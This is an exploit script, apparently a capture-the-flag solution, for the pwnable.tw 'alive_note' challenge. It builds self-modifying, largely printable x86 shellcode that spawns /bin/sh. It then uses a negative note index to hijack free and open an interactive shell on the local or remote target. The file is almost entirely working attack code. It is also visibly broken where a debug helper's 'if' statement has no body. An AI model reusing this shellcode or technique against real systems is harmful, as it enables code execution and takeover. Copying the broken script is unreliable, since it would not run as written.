#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
	cn = process('./alive_note')
	bin = ELF('./alive_note')
else:
	cn = remote('chall.pwnable.tw', 10300)


def z(a=''):
	gdb.attach(cn,a)
	if a == '': 
pay = """
/*0x0*/
pop edx;
pop ecx; /* shellcode addr */
pop eax;
pop eax; /* stack addr */
xor cl,[ecx+0x4c]
inc ecx;

/* edx = 0x80488ef */
/* ebx = 0 */

add    BYTE PTR [eax],al;
add    BYTE PTR [eax],al;
adc    DWORD PTR [eax],eax;
add    BYTE PTR [eax],al;


/*0x10*/
inc ecx;
inc ecx;/* cl = 0xc */
push 0x6e6e6e6e
pop edx

add    BYTE PTR [eax],al;
add    BYTE PTR [eax],al;
adc    DWORD PTR [eax],eax;
add    BYTE PTR [eax],al;

/*0x20*/
xor [ecx],dh
dec ecx;
dec ecx;
dec ecx;
dec ecx;/* cl = 0x8 */
xor [ecx],dh


add    BYTE PTR [eax],al;
add    BYTE PTR [eax],al;
adc    DWORD PTR [eax],eax;
add    BYTE PTR [eax],al;

/*0x30*/

push ecx
push ebx
xor [ecx+0x46],dh
pop ecx
.byte 0x35 /* pop ebx*/
pop edx
/*eax = stack addr*/
/*ebx = /bin/sh */
/*ecx = 0 */
/*edx = 0x6e6e6e6e */

add    BYTE PTR [eax],al;
add    BYTE PTR [eax],al;
adc    DWORD PTR [eax],eax;
add    BYTE PTR [eax],al;

/*0x40*/
xor [ebx+0x64],dl /*smc int*/
xor [ebx+0x65],dl /*smc 0x80*/
push ecx
pop edx
/*eax = stack addr*/
/*ebx = /bin/sh */
/*ecx = 0 */
/*edx = 0 */

add    BYTE PTR [eax],al;
add    BYTE PTR [eax],al;
adc    DWORD PTR [eax],eax;
add    BYTE PTR [eax],al;

/*0x50*/
pop eax
pop eax
xor al,0x4a
.byte 0x74 /* int */
.byte 0x39 /* 0x80*/

add    BYTE PTR [eax],al;
add    BYTE PTR [eax],al;
adc    DWORD PTR [eax],eax;
add    BYTE PTR [eax],al;

/*0x60*/
.byte 0x41 /* for 0xb */
.byte 0x00 /* for 0xb */
.byte 0x00 /* for 0xb */
.byte 0x00 /* for 0xb */



/* execve("/bin/sh",0,0) */
/* eax=0xb, ebx = /bin/sh,ecx=0 ,edx=0*/
"""

shellcode= asm(pay)
print shellcode

print len(shellcode)

scs = shellcode.split('\x00\x00\x00\x00\x11\x00\x00\x00')

def add(idx,s):
	cn.recvuntil('Your choice :')
	cn.sendline('1')
	cn.recvuntil('Index :')
	cn.sendline(str(idx))
	cn.recvuntil('Name :')
	cn.send(s.ljust(8,'\x00'))

add(0,'AbinAsh')#/bin/sh in heap

add(-27,scs[0])#hijack free

for i in range(1,len(scs)):
	add(0,scs[i])

z('b*0x080488EA\n')
pause()

#delete
cn.recvuntil('Your choice :')
cn.sendline('3')
cn.recvuntil('Index :')
cn.sendline('-27')

cn.interactive()
